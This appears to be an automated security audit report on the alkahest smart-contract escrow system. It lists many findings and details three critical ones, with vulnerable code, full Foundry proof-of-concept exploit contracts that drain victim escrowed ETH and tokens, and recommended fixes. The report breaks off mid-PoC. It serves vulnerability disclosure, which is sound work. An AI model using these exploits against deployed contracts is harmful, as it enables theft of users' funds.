# Apex Report - alkahest / Scan #1

## Table of contents

- [Critical](#critical)
  - [ALKA-8 — BaseSplitter refund proxy can steal any native escrow collected into the splitter during fulfillment creation](#finding-alka-8)
  - [ALKA-16 — Proxy escrows can collect a different escrow and redistribute the victim assets under attacker-controlled splits](#finding-alka-16)
  - [ALKA-30 — AttestationEscrowObligation can mint unbacked escrows under its own schema](#finding-alka-30)
  - [ALKA-25 — createFulfillment refunds unrelated ETH inflows and lets a malicious obligation steal collectible native escrows](#finding-alka-25)
  - [ALKA-17 — Proxy collect can substitute a different fulfillment and redirect EXECUTOR_SENTINEL payouts to an attacker-recorded fulfiller](#finding-alka-17)
  - [ALKA-5 — CommitRevealObligation replays one revealed fulfillment across later unconditional escrows](#finding-alka-5)
- [High](#high)
  - [ALKA-31 — Any caller can permanently brick splitter settlements by calling the underlying escrow directly](#finding-alka-31)
  - [ALKA-34 — Public unsafe partial splitter settlement lets outsiders finalize only attacker-favorable transfers](#finding-alka-34)
  - [ALKA-33 — AtomicPaymentUtils accepts arbitrary attesters and can pay attacker-defined demands without any real escrow](#finding-alka-33)
  - [ALKA-32 — TokenBundleSplitterUnvalidated can steal previously stranded native, ERC20, and ERC1155 balances through later over-allocation](#finding-alka-32)
  - [ALKA-28 — Supported Ethereum and GenLayer SDK configs send payable helper calls to 0x0](#finding-alka-28)
  - [ALKA-2 — Oracle-gated commit-reveal still allows post-reveal settlement theft before collect](#finding-alka-2)
  - [ALKA-19 — Supported-chain presets silently wire unreleased hook and splitter surfaces to address(0), allowing ETH burns](#finding-alka-19)
- [Medium](#medium)
  - [ALKA-9 — TrustedOracle manual arbitration helper records a decision key that collect() never checks](#finding-alka-9)
  - [ALKA-23 — Commit-reveal docs still prescribe empty demand bytes and a stale Base Sepolia deployment, enabling free-work traps](#finding-alka-23)
  - [ALKA-12 — Stale Base Sepolia address metadata still points default users to an ExpirationTimeBefore arbiter that accepts non-expiring fulfillments](#finding-alka-12)
  - [ALKA-21 — Shipped TypeScript bundle clients cannot represent or forward native value, breaking every mixed-native bundle flow](#finding-alka-21)
  - [ALKA-3 — extractDemandData/getEscrowAndDemand hide the TrustedOracle authorizer from counterparties](#finding-alka-3)
  - [ALKA-10 — TrustedOracle arbitration status helpers treat any fulfillment-level event as the final decision](#finding-alka-10)
  - [ALKA-7 — AttestationReferenceEscrowObligation can only deliver irrevocable validation attestations even when validationRevocable is true](#finding-alka-7)
  - [ALKA-20 — Generic demand helpers let arbitrary arbiters masquerade as benign TrustedOracle payloads](#finding-alka-20)
  - [ALKA-27 — Ethereum and GenLayer decoders classify the zero arbiter as ReferencesEscrowArbiter instead of unknown](#finding-alka-27)
  - [ALKA-18 — Top-level demand extractors silently unwrap every escrow as TrustedOracle and hide alternate arbiter branches](#finding-alka-18)
  - [ALKA-4 — Atomic attestation helper misattributes nested Attested logs and can hand out a malicious escrow UID](#finding-alka-4)
  - [ALKA-15 — createFulfillment accepts replayed same-contract UIDs and can retroactively assign EXECUTOR_SENTINEL payouts](#finding-alka-15)
- [Low](#low)
  - [ALKA-13 — Stale Base Sepolia address metadata still points default users to a token-bundle escrow with permissionless destructive partial settlement](#finding-alka-13)
  - [ALKA-14 — Zero-address references arbiter is surfaced as a safe known policy on supported chains](#finding-alka-14)
  - [ALKA-24 — Hook-based validation certificates can be labeled revocable even though no one can ever revoke them](#finding-alka-24)
  - [ALKA-6 — TypeScript demand helpers strip the trusted oracle address from escrow inspection](#finding-alka-6)
  - [ALKA-11 — AttestationEscrowObligation can only deliver irrevocable attestations even when the request says revocable](#finding-alka-11)
  - [ALKA-26 — Base Sepolia address docs still route token-bundle escrows to a pre-fix partial-collection deployment](#finding-alka-26)
  - [ALKA-29 — CommitRevealObligation’s bond model is exhaustively bypassable for low-entropy fulfillments, so attackers can precommit every answer and steal the escrow](#finding-alka-29)
  - [ALKA-1 — Trusted-oracle `allUnarbitrated` mode suppresses demand-specific decisions after any earlier decision on the same fulfillment](#finding-alka-1)
  - [ALKA-22 — Confirmation request helpers collapse the `(fulfillment, escrow)` authority key and can route confirmations to the wrong escrow](#finding-alka-22)

<a id="critical"></a>
## Critical

<a id="finding-alka-8"></a>
### ALKA-8 — BaseSplitter refund proxy can steal any native escrow collected into the splitter during fulfillment creation

#### Summary

`BaseSplitter.createFulfillment()` refunds any native balance increase after calling an attacker-chosen obligation. A malicious obligation can use `_afterAttest()` to trigger `collect()` on a separate native escrow whose valid recipient is the splitter, causing the escrowed ETH to land in the splitter and then be refunded to the attacker instead of staying for `collectAndDistribute()`. The victim escrow is revoked, so the intended settlement path is lost.

#### Context Files

##### BaseSplitter.createFulfillment

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 95

```solidity
function createFulfillment(address obligationContract, bytes calldata data, uint64 expirationTime, bytes32 refUID)
    external
    payable
    nonReentrant
    returns (bytes32 fulfillmentUid)
{
    uint256 retainedBalance = address(this).balance - msg.value;
    fulfillmentUid = IObligation(obligationContract).doObligationRaw{value: msg.value}(data, expirationTime, refUID);
    _validateCreatedFulfillment(fulfillmentUid, obligationContract, data, expirationTime, refUID);
    if (fulfillers[fulfillmentUid] != address(0)) revert FulfillerAlreadyRecorded(fulfillmentUid);
    fulfillers[fulfillmentUid] = msg.sender;
    _refundNativeBalanceIncrease(retainedBalance, msg.sender);
}
```

##### BaseSplitter._refundNativeBalanceIncrease

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 158

```solidity
function _refundNativeBalanceIncrease(uint256 retainedBalance, address recipient) internal {
    uint256 currentBalance = address(this).balance;
    if (currentBalance <= retainedBalance) return;

    uint256 refundAmount = currentBalance - retainedBalance;
    (bool success,) = payable(recipient).call{value: refundAmount}("");
    if (!success) revert NativeTokenRefundFailed(recipient, refundAmount);
}

receive() external payable virtual {}
```

##### BaseObligation._doObligationForRaw

Path: `alkahest/contracts/src/BaseObligation.sol`
Highlight lines: 40

```solidity
function _doObligationForRaw(bytes memory data, uint64 expirationTime, address recipient, bytes32 refUID)
    internal
    virtual
    nonReentrant
    returns (bytes32 uid_)
{
    _beforeAttest(data, msg.sender, recipient);
    uid_ = _attest(data, recipient, expirationTime, refUID);
    _afterAttest(...);
}
```

##### BaseEscrowObligation.collect

Path: `alkahest/contracts/src/BaseEscrowObligation.sol`
Highlight lines: 76

```solidity
function collect(bytes32 _escrow, bytes32 _fulfillment)
    public
    virtual
    override
    nonReentrant
    returns (bytes memory)
{
    ...
    if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
        revert InvalidFulfillment();
    }
    ...
    bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
    emit EscrowCollected(_escrow, _fulfillment, fulfillment.recipient);
    return result;
}
```

##### NativeTokenEscrowObligation._releaseEscrow

Path: `alkahest/contracts/src/obligations/escrow/default/NativeTokenEscrowObligation.sol`
Highlight lines: 66

```solidity
function _releaseEscrow(Attestation memory escrow, address to, bytes32)
    internal
    override
    returns (bytes memory)
{
    ObligationData memory decoded = abi.decode(escrow.data, (ObligationData));
    (bool success,) = payable(to).call{value: decoded.amount}("");
    if (!success) revert NativeTokenTransferFailed(to, decoded.amount);
    return "";
}
```

#### Proof of Concept

Run the focused Foundry test from `alkahest/contracts`:

```bash
cd alkahest/contracts
timeout 300 forge test --match-path test/poc/POC_NativeTokenSplitterRefundSteal_c4f83e00.t.sol -vvvv
```

The trace shows the malicious obligation calling `escrow.collect(victimEscrow, victimFulfillment)` from `_afterAttest()`, the victim escrow transferring `1 ETH` into the splitter, the attacker receiving that `1 ETH` during `createFulfillment()`, and a later `collectAndDistribute()` reverting because the escrow has already been revoked.

##### POC_NativeTokenSplitterRefundSteal_c4f83e00.t.sol

Path: `test/poc/POC_NativeTokenSplitterRefundSteal_c4f83e00.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";

import {IEscrow} from "@src/IEscrow.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {NativeTokenSplitter} from "@src/utils/splitters/NativeTokenSplitter.sol";

import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract CollectVictimEscrowStringObligation is StringObligation {
    IEscrow internal immutable escrow;
    bytes32 internal immutable victimEscrow;
    bytes32 internal immutable victimFulfillment;

    constructor(
        IEAS _eas,
        ISchemaRegistry _schemaRegistry,
        IEscrow _escrow,
        bytes32 _victimEscrow,
        bytes32 _victimFulfillment
    ) StringObligation(_eas, _schemaRegistry) {
        escrow = _escrow;
        victimEscrow = _victimEscrow;
        victimFulfillment = _victimFulfillment;
    }

    function _afterAttest(Attestation memory) internal override {
        escrow.collect(victimEscrow, victimFulfillment);
    }
}

/**
 * @title POC: BaseSplitter refunds stolen native escrow proceeds
 * @notice Proof Statement: Proves an attacker can call `BaseSplitter.createFulfillment()` with a malicious obligation that
 * collects an unrelated, already-approved native escrow during `_afterAttest()`. The victim escrow releases ETH to the
 * splitter, and `BaseSplitter._refundNativeBalanceIncrease()` then forwards that ETH to the attacker instead of preserving
 * it for `collectAndDistribute()`, leaving the victim escrow consumed and the intended recipient unpaid.
 */
contract POC_NativeTokenSplitterRefundSteal_c4f83e00 is Test {
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    NativeTokenSplitter internal splitter;
    NativeTokenEscrowObligation internal escrowObligation;
    StringObligation internal honestObligation;

    address internal buyer = makeAddr("buyer");
    address internal oracle = makeAddr("oracle");
    address internal fulfiller = makeAddr("fulfiller");
    address internal attacker = makeAddr("attacker");
    address internal alice = makeAddr("alice");
    address internal collector = makeAddr("collector");

    uint256 internal constant AMOUNT = 1 ether;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();
        splitter = new NativeTokenSplitter(eas);
        escrowObligation = new NativeTokenEscrowObligation(eas, schemaRegistry);
        honestObligation = new StringObligation(eas, schemaRegistry);

        vm.deal(buyer, 10 ether);
    }

    function testPOC_AttackerStealsVictimEscrowWithRefundProxy() public {
        bytes32 victimEscrow = _createVictimEscrow();
        bytes32 victimFulfillment = _createVictimFulfillment(victimEscrow);
        _recordSplitDecision(victimEscrow, victimFulfillment);

        CollectVictimEscrowStringObligation maliciousObligation = new CollectVictimEscrowStringObligation(
            eas, schemaRegistry, IEscrow(address(escrowObligation)), victimEscrow, victimFulfillment
        );

        bytes memory attackData =
            abi.encode(StringObligation.ObligationData({item: "attacker-fulfillment", schema: bytes32(0)}));
        assertEq(address(escrowObligation).balance, AMOUNT);
        assertEq(address(splitter).balance, 0);
        assertEq(attacker.balance, 0);
        assertEq(alice.balance, 0);

        vm.prank(attacker);
        bytes32 attackFulfillment =
            splitter.createFulfillment(address(maliciousObligation), attackData, 0, bytes32(0));

        assertTrue(attackFulfillment != victimFulfillment);
        assertEq(attacker.balance, AMOUNT, "attacker receives victim escrow through refund path");
        assertEq(address(splitter).balance, 0, "splitter retains no ETH after refund");
        assertEq(address(escrowObligation).balance, 0, "victim escrow contract has released the ETH");
        assertEq(alice.balance, 0, "intended split recipient is unpaid");

        Attestation memory escrowAttestation = eas.getAttestation(victimEscrow);
        assertTrue(escrowAttestation.revocationTime != 0, "victim escrow is permanently consumed");

        vm.prank(collector);
        vm.expectRevert();
        splitter.collectAndDistribute(address(escrowObligation), victimEscrow, victimFulfillment);
    }

    function _createVictimEscrow() internal returns (bytes32) {
        bytes memory demand = abi.encode(NativeTokenSplitter.DemandData({oracle: oracle, data: bytes("")}));
        NativeTokenEscrowObligation.ObligationData memory data =
            NativeTokenEscrowObligation.ObligationData({amount: AMOUNT, arbiter: address(splitter), demand: demand});
        vm.prank(buyer);
        return escrowObligation.doObligation{value: AMOUNT}(data, uint64(block.timestamp + 1 days));
    }

    function _createVictimFulfillment(bytes32 escrowUid) internal returns (bytes32) {
        bytes memory obligationData =
            abi.encode(StringObligation.ObligationData({item: "victim-fulfillment", schema: bytes32(0)}));
        vm.prank(fulfiller);
        return splitter.createFulfillment(address(honestObligation), obligationData, 0, escrowUid);
    }

    function _recordSplitDecision(bytes32 escrowUid, bytes32 fulfillmentUid) internal {
        NativeTokenSplitter.Split[] memory splits = new NativeTokenSplitter.Split[](1);
        splits[0] = NativeTokenSplitter.Split({recipient: alice, amount: AMOUNT});

        vm.prank(oracle);
        splitter.arbitrate(fulfillmentUid, escrowUid, splits);
    }
}

```

#### Recommendation

The splitter must stop treating arbitrary balance increases as refundable excess.

Primary fix:
- remove blanket native balance refunding from `BaseSplitter.createFulfillment()`; and
- replace it with explicit, obligation-specific return values or a tightly scoped refund mechanism that only refunds the unused portion of `msg.value` from the called helper.

Safer patterns include:
- having `createFulfillment()` compare the splitter’s balance only against a value returned by a trusted helper interface; or
- prohibiting helper obligations from sending native tokens to the splitter during fulfillment creation unless the helper is allowlisted and its refund semantics are known.

Defense-in-depth:
- reject unexpected native receipts during `createFulfillment()` unless they equal a caller-committed refund amount;
- add an escrow-aware guard so splitter-addressed native escrows cannot be collected except through the splitter’s own settlement entrypoint.

#### Assumptions

- [x] The target escrow has already become collectible and its valid fulfillment recipient is the splitter.
- [x] The attacker can observe the escrow UID and fulfillment UID before the honest settlement transaction finalizes.
- [x] The attacker can deploy a malicious obligation contract that creates a valid splitter-addressed attestation and calls the victim escrow’s `collect()` during the helper flow.
- [x] The splitter has no pre-existing balance-change guard that whitelists only the helper’s own refund path.

#### Predicted Invalid Reasons

- "This is just a malicious obligation chosen by the caller; `createFulfillment()` is an unsafe helper if you point it at arbitrary contracts."

<a id="finding-alka-16"></a>
### ALKA-16 — Proxy escrows can collect a different escrow and redistribute the victim assets under attacker-controlled splits

#### Summary

A malicious escrow contract can self-attest a fake splitter escrow, proxy `collect` into a real collectible victim escrow, and cause the splitter to accept the victim assets as if they came from the fake escrow. Because payout policy is decoded before the external call and only the post-call balance delta is checked, the attacker can redistribute the victim funds under attacker-controlled splits across `ERC20Splitter`, `NativeTokenSplitter`, `ERC1155Splitter`, and `TokenBundleSplitterBase`.

#### Proof of Concept

1. Save the following test as `contracts/test/unit/utils/splitters/POC_ERC20Splitter_590c65f6.t.sol`.
2. From `alkahest/contracts`, run `timeout 300s forge test --match-path test/unit/utils/splitters/POC_ERC20Splitter_590c65f6.t.sol -vv`.
3. Confirm the output includes `attacker_balance: 100000000000000000000`, `alice_balance: 0`, `bob_balance: 0`, `victim_escrow_revocation: 1`, and `fake_escrow_revocation: 0`.

##### POC_ERC20Splitter_590c65f6.t.sol

Path: `contracts/test/unit/utils/splitters/POC_ERC20Splitter_590c65f6.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {BaseObligation} from "@src/BaseObligation.sol";
import {IEscrow} from "@src/IEscrow.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {ERC20EscrowObligation} from "@src/obligations/escrow/default/ERC20EscrowObligation.sol";
import {ERC20Splitter} from "@src/utils/splitters/ERC20Splitter.sol";

import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mintable Token", "MINT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ProxyERC20Escrow is BaseObligation {
    address public victimEscrowContract;
    bytes32 public victimEscrowUid;
    bytes32 public victimFulfillmentUid;

    constructor(IEAS eas, ISchemaRegistry schemaRegistry)
        BaseObligation(eas, schemaRegistry, "address arbiter, bytes demand, address token, uint256 amount", true)
    {}

    function arm(address escrowContract, bytes32 escrowUid, bytes32 fulfillmentUid) external {
        victimEscrowContract = escrowContract;
        victimEscrowUid = escrowUid;
        victimFulfillmentUid = fulfillmentUid;
    }

    function collect(bytes32, bytes32) external returns (bytes memory) {
        return IEscrow(victimEscrowContract).collect(victimEscrowUid, victimFulfillmentUid);
    }
}

/**
 * @title POC: Proxy escrow steals a foreign collectible escrow through ERC20Splitter
 * @notice Proof Statement: Proves an unprivileged attacker can feed ERC20Splitter a fake escrow and fake oracle
 * decision, while a malicious proxy escrow contract actually collects a different real escrow whose fulfillment
 * points at the splitter; the splitter accepts the foreign token delta, revokes the victim escrow, and distributes
 * the victim tokens according to the attacker-controlled fake splits.
 */
contract POC_ERC20Splitter_590c65f6_Test is Test {
    uint256 internal constant AMOUNT = 100 ether;
    uint64 internal constant EXPIRATION = 365 days;

    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    ERC20Splitter internal splitter;
    ERC20EscrowObligation internal realEscrow;
    StringObligation internal stringObligation;
    MintableERC20 internal token;
    ProxyERC20Escrow internal proxyEscrow;

    address internal buyer = makeAddr("buyer");
    address internal honestOracle = makeAddr("honestOracle");
    address internal executor = makeAddr("executor");
    address internal attacker = makeAddr("attacker");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        splitter = new ERC20Splitter(eas);
        realEscrow = new ERC20EscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);
        token = new MintableERC20();
        proxyEscrow = new ProxyERC20Escrow(eas, schemaRegistry);

        token.mint(buyer, 1_000 ether);
    }

    function test_proxyEscrowCollectsVictimEscrowAndRedistributesToAttacker() public {
        bytes32 victimEscrowUid = _createVictimEscrow();
        bytes32 victimFulfillmentUid = _createFulfillment(executor, victimEscrowUid);

        ERC20Splitter.Split[] memory victimSplits = new ERC20Splitter.Split[](2);
        victimSplits[0] = ERC20Splitter.Split({recipient: alice, amount: 60 ether});
        victimSplits[1] = ERC20Splitter.Split({recipient: bob, amount: 40 ether});

        vm.prank(honestOracle);
        splitter.arbitrate(victimFulfillmentUid, victimEscrowUid, victimSplits);

        bytes memory fakeDemand = abi.encode(ERC20Splitter.DemandData({oracle: attacker, data: bytes("")}));
        bytes memory fakeEscrowData = abi.encode(
            ERC20Splitter.EscrowObligationData({
                arbiter: address(splitter),
                demand: fakeDemand,
                token: address(token),
                amount: AMOUNT
            })
        );

        vm.prank(attacker);
        bytes32 fakeEscrowUid = proxyEscrow.doObligationRaw(fakeEscrowData, 0, bytes32(0));

        bytes32 fakeFulfillmentUid = _createFulfillment(attacker, fakeEscrowUid);

        ERC20Splitter.Split[] memory attackerSplits = new ERC20Splitter.Split[](1);
        attackerSplits[0] = ERC20Splitter.Split({recipient: attacker, amount: AMOUNT});

        vm.prank(attacker);
        splitter.arbitrate(fakeFulfillmentUid, fakeEscrowUid, attackerSplits);

        proxyEscrow.arm(address(realEscrow), victimEscrowUid, victimFulfillmentUid);

        vm.prank(attacker);
        splitter.collectAndDistribute(address(proxyEscrow), fakeEscrowUid, fakeFulfillmentUid);

        Attestation memory realEscrowAttestation = eas.getAttestation(victimEscrowUid);
        Attestation memory fakeEscrowAttestation = eas.getAttestation(fakeEscrowUid);

        emit log_named_uint("attacker_balance", token.balanceOf(attacker));
        emit log_named_uint("alice_balance", token.balanceOf(alice));
        emit log_named_uint("bob_balance", token.balanceOf(bob));
        emit log_named_uint("victim_escrow_revocation", realEscrowAttestation.revocationTime);
        emit log_named_uint("fake_escrow_revocation", fakeEscrowAttestation.revocationTime);

        assertEq(token.balanceOf(attacker), AMOUNT, "attacker receives the victim escrow");
        assertEq(token.balanceOf(alice), 0, "legitimate split recipient loses payout");
        assertEq(token.balanceOf(bob), 0, "legitimate split recipient loses payout");
        assertEq(token.balanceOf(address(splitter)), 0, "splitter does not retain the stolen funds");
        assertGt(realEscrowAttestation.revocationTime, 0, "real victim escrow was consumed");
        assertEq(fakeEscrowAttestation.revocationTime, 0, "fake escrow stayed unconsumed");
    }

    function _createVictimEscrow() internal returns (bytes32) {
        bytes memory demand = abi.encode(ERC20Splitter.DemandData({oracle: honestOracle, data: bytes("")}));
        ERC20EscrowObligation.ObligationData memory data = ERC20EscrowObligation.ObligationData({
            arbiter: address(splitter),
            demand: demand,
            token: address(token),
            amount: AMOUNT
        });

        vm.startPrank(buyer);
        token.approve(address(realEscrow), AMOUNT);
        bytes32 escrowUid = realEscrow.doObligation(data, uint64(block.timestamp + EXPIRATION));
        vm.stopPrank();

        return escrowUid;
    }

    function _createFulfillment(address caller, bytes32 escrowUid) internal returns (bytes32) {
        bytes memory obligationData =
            abi.encode(StringObligation.ObligationData({item: "fulfillment", schema: bytes32(0)}));

        vm.prank(caller);
        return splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
    }
}
```

##### forge test command

Path: `alkahest/contracts`

```bash
timeout 300s forge test --match-path test/unit/utils/splitters/POC_ERC20Splitter_590c65f6.t.sol -vv
```

#### Recommendation

The splitter must bind settlement to trusted escrow implementations, not just to any contract that can attest a matching schema.

Primary fix:
- Restrict splitters to a vetted allowlist or factory of canonical escrow contracts.
- Reject arbitrary externally supplied escrow contracts, even if they can attest the right schema.

Additional hardening:
- Extend the escrow interface so `collect` returns the actually consumed escrow UID and fulfillment UID, then verify they exactly match the splitter call inputs.
- Re-check canonical postconditions after `collect`, including that the expected escrow implementation itself revoked the same escrow that the splitter decoded.

Fix checklist:

- [ ] Restrict splitters to canonical escrow contracts from a trusted factory allowlist.

#### Assumptions

- [x] `collectAndDistribute` is permissionless and the caller can choose `escrowContract`, `escrow`, and `fulfillment`.
- [x] `BaseEscrowObligation.collect` remains publicly callable once the arbiter condition passes.
- [x] A user-deployed escrow contract can self-author a valid-looking attestation under its own schema. 

#### Predicted Invalid Reasons

- The caller chooses `escrowContract`; if they pass a malicious contract, that is caller misuse. The splitter still verifies attestation provenance and exact received balances, so it only distributes real assets actually received.

<a id="finding-alka-30"></a>
### ALKA-30 — AttestationEscrowObligation can mint unbacked escrows under its own schema

#### Summary

`_releaseEscrow()` can mint a second attestation under `ATTESTATION_SCHEMA` without re-running `_lockEscrow()`, so a free outer escrow can forge an unbacked self-schema escrow that `check()` and `reclaim()` treat as real and use to drain pooled ETH.

#### Context Files

##### BaseAttester constructor/onAttest

Path: `contracts/src/BaseAttester.sol`
Highlight lines: 1

```solidity
constructor(IEAS _eas, ISchemaRegistry _schemaRegistry, string memory schema, bool revocable) SchemaResolver(_eas) {
    eas = _eas;
    schemaRegistry = _schemaRegistry;
    ATTESTATION_SCHEMA_REVOCABLE = revocable;
    ATTESTATION_SCHEMA = schemaRegistry.registerOrReuse(schema, ISchemaResolver(address(this)), revocable);
}

function onAttest(Attestation calldata attestation, uint256) internal view override returns (bool) {
    return attestation.attester == address(this);
}
```

##### AttestationEscrowObligation lock/release

Path: `contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`
Highlight lines: 1

```solidity
function _lockEscrow(bytes memory data, address) internal override {
    ObligationData memory decoded = abi.decode(data, (ObligationData));
    uint256 requiredValue = decoded.attestation.data.value;
    if (msg.value != requiredValue) {
        revert IncorrectPayment(requiredValue, msg.value);
    }
}

function _releaseEscrow(Attestation memory escrow, address, bytes32) internal override returns (bytes memory) {
    ObligationData memory decoded = abi.decode(escrow.data, (ObligationData));

    bytes32 attestationUid;
    try eas.attest{value: decoded.attestation.data.value}(decoded.attestation) returns (bytes32 uid) {
        attestationUid = uid;
    } catch {
        revert AttestationCreationFailed();
    }

    return abi.encode(attestationUid);
}
```

##### AttestationEscrowObligation check

Path: `contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`
Highlight lines: 1

```solidity
function check(Attestation memory obligation, bytes memory demand, bytes32)
    public
    view
    override
    returns (bool)
{
    if (obligation.schema != ATTESTATION_SCHEMA) return false;

    ObligationData memory escrow = abi.decode(obligation.data, (ObligationData));
    ObligationData memory demandData = abi.decode(demand, (ObligationData));

    return keccak256(abi.encode(escrow.attestation)) == keccak256(abi.encode(demandData.attestation))
        && escrow.arbiter == demandData.arbiter
        && keccak256(escrow.demand) == keccak256(demandData.demand);
}
```

##### BaseEscrowObligation collect/reclaim

Path: `contracts/src/BaseEscrowObligation.sol`
Highlight lines: 1

```solidity
function collect(bytes32 _escrow, bytes32 _fulfillment) public virtual override nonReentrant returns (bytes memory) {
    Attestation memory escrow = _getExistingAttestation(_escrow);
    Attestation memory fulfillment = _getExistingAttestation(_fulfillment);
    ...
    if (fulfillment.refUID != escrow.uid) revert InvalidFulfillment();
    if (!fulfillment._checkIntrinsic()) revert InvalidFulfillment();
    if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) revert InvalidFulfillment();
    ...
    bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
}

function reclaim(bytes32 uid) public virtual override nonReentrant returns (bool) {
    Attestation memory attestation = _getExistingAttestation(uid);
    ...
    _returnEscrow(attestation, attestation.recipient);
}
```

#### Proof of Concept

The Foundry PoC reproduces the issue end-to-end:

1. Alice opens a legitimate paid escrow with `1 ETH`, leaving pooled balance in `AttestationEscrowObligation`.
2. Bob opens a zero-value outer escrow whose embedded request targets `AttestationEscrowObligation.ATTESTATION_SCHEMA()` and encodes a fake paid escrow.
3. Bob collects the outer escrow to mint the forged inner escrow, then calls `reclaim()` after expiry to withdraw Alice's pooled ETH.

##### POC_AttestationEscrowDrainPoC_be380de2.t.sol

Path: `contracts/test/poc/POC_AttestationEscrowDrainPoC_be380de2.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {AttestationEscrowObligation} from "@src/obligations/escrow/default/AttestationEscrowObligation.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {TrivialArbiter} from "@src/arbiters/TrivialArbiter.sol";
import {IEAS, Attestation, AttestationRequest, AttestationRequestData} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {SchemaResolver} from "@eas/resolver/SchemaResolver.sol";
import {ISchemaResolver} from "@eas/resolver/ISchemaResolver.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract AcceptingPayableResolver is SchemaResolver {
    uint256 public attestValue;
    uint256 public revokeValue;

    constructor(IEAS eas) SchemaResolver(eas) {}

    function isPayable() public pure override returns (bool) {
        return true;
    }

    function onAttest(Attestation calldata, uint256 value) internal override returns (bool) {
        attestValue = value;
        return true;
    }

    function onRevoke(Attestation calldata, uint256 value) internal override returns (bool) {
        revokeValue = value;
        return true;
    }
}

/**
 * @title POC: AttestationEscrowObligation Mints Unbacked Self-Schema Escrows
 * @notice Proof Statement: Prove that collecting a free attestation escrow can mint a second
 * self-schema attestation whose encoded `attestation.data.value` is non-zero even though no ETH
 * was locked for that second escrow, and that reclaiming the forged escrow drains ETH that
 * belongs to a legitimate paid attestation escrow already pooled in the contract.
 */
contract POC_AttestationEscrowDrainPoC_be380de2 is Test {
    AttestationEscrowObligation internal escrow;
    StringObligation internal stringObligation;
    TrivialArbiter internal trivialArbiter;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    AcceptingPayableResolver internal payableResolver;
    bytes32 internal paidSchemaId;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    uint256 internal constant STOLEN_VALUE = 1 ether;

    function setUp() public {
        vm.warp(1_000_000);

        EASDeployer deployer = new EASDeployer();
        (eas, schemaRegistry) = deployer.deployEAS();

        escrow = new AttestationEscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);
        trivialArbiter = new TrivialArbiter();

        payableResolver = new AcceptingPayableResolver(eas);
        paidSchemaId = schemaRegistry.register("string paidData", ISchemaResolver(address(payableResolver)), true);

        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function test_free_outer_escrow_can_forge_and_reclaim_unbacked_paid_escrow() public {
        AttestationEscrowObligation.ObligationData memory legitimateEscrowData = AttestationEscrowObligation
            .ObligationData({
            arbiter: address(trivialArbiter),
            demand: abi.encode("legitimate demand"),
            attestation: _paidAttestationRequest(alice, 7 days, STOLEN_VALUE)
        });

        vm.prank(alice);
        bytes32 legitimateEscrowUid =
            escrow.doObligation{value: STOLEN_VALUE}(legitimateEscrowData, uint64(block.timestamp + 30 days));

        assertNotEq(legitimateEscrowUid, bytes32(0), "legitimate escrow should exist");
        assertEq(address(escrow).balance, STOLEN_VALUE, "legitimate paid escrow should pool ETH");

        AttestationEscrowObligation.ObligationData memory forgedPaidEscrowData = AttestationEscrowObligation
            .ObligationData({
            arbiter: address(trivialArbiter),
            demand: abi.encode("forged demand"),
            attestation: _paidAttestationRequest(bob, 0, STOLEN_VALUE)
        });

        AttestationRequest memory selfSchemaCounterfeitRequest = AttestationRequest({
            schema: escrow.ATTESTATION_SCHEMA(),
            data: AttestationRequestData({
                recipient: bob,
                expirationTime: uint64(block.timestamp + 1),
                revocable: true,
                refUID: bytes32(0),
                data: abi.encode(forgedPaidEscrowData),
                value: 0
            })
        });

        AttestationEscrowObligation.ObligationData memory freeOuterEscrowData = AttestationEscrowObligation
            .ObligationData({
            arbiter: address(trivialArbiter),
            demand: abi.encode("outer demand"),
            attestation: selfSchemaCounterfeitRequest
        });

        vm.prank(bob);
        bytes32 outerEscrowUid = escrow.doObligation(freeOuterEscrowData, uint64(block.timestamp + 1 days));

        assertNotEq(outerEscrowUid, bytes32(0), "free outer escrow should exist");
        assertEq(address(escrow).balance, STOLEN_VALUE, "forged escrow should not add backing ETH");

        vm.prank(bob);
        bytes32 fulfillmentUid = stringObligation.doObligation(
